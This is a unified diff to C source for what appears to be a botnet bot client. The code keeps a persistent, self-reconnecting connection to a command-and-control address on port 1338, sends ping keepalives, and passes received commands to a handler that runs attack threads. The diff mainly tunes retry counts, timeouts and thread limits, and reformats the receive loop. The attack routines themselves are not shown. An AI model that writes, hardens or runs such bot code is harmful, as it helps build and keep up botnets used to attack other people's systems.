@@ -29,12 +29,12 @@
 
 #define CNC_IP "0.0.0.0"
 #define BOT_PORT 1338
-#define MAX_THREADS 3
-#define RETRY_DELAY 4
-#define RECV_TIMEOUT_MS 3000
-#define MAX_RETRIES 5
+#define MAX_THREADS 1
+#define RETRY_DELAY 5
+#define RECV_TIMEOUT_MS 8000
+#define MAX_RETRIES 35
 #define CONNECTION_TIMEOUT 5
-#define PING_INTERVAL 30
+#define PING_INTERVAL 5
 
 pthread_t attack_threads[MAX_THREADS] = {0};
 pthread_mutex_t thread_mutex = PTHREAD_MUTEX_INITIALIZER;
@@ -282,7 +282,6 @@ int main(int argc, char** argv) {
         int optval = 1;
         setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval));
         setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
-        
         int keepidle = 10;
         int keepintvl = 5;
         int keepcnt = 3;
@@ -316,7 +315,6 @@ int main(int argc, char** argv) {
             struct pollfd fds;
             fds.fd = sock;
             fds.events = POLLIN;
-            
             time_t now = time(NULL);
             if (now - last_ping >= PING_INTERVAL) {
                 if (send(sock, "ping", 4, MSG_NOSIGNAL) <= 0) {
@@ -324,23 +322,21 @@ int main(int argc, char** argv) {
                 }
                 last_ping = now;
             }
-
             int poll_timeout = (last_ping + PING_INTERVAL - now) * 1000;
             if (poll_timeout < 0) poll_timeout = 0;
-            
             int ret = poll(&fds, 1, poll_timeout);
             if (ret < 0 && errno != EINTR) {
                 break;
             }
-
             if (ret > 0) {
-                if (fds.revents & POLLIN) {                n = recv(sock, command, sizeof(command)-1, 0);
-                if (n <= 0) {
-                    if (errno != EAGAIN && errno != EWOULDBLOCK) {
-                        break;
+                if (fds.revents & POLLIN) {
+                    n = recv(sock, command, sizeof(command)-1, 0);
+                    if (n <= 0) {
+                        if (errno != EAGAIN && errno != EWOULDBLOCK) {
+                            break;
+                        }
+                        continue;
                     }
-                    continue;
-                }
                     command[n] = 0;
                     handle_command(command, sock);
                     memset(command, 0, sizeof(command));
@@ -356,9 +352,6 @@ int main(int argc, char** argv) {
             close(sock);
             sock = -1;
         }
-
         sleep(RETRY_DELAY);
     }
-    
-    return 0;
 }
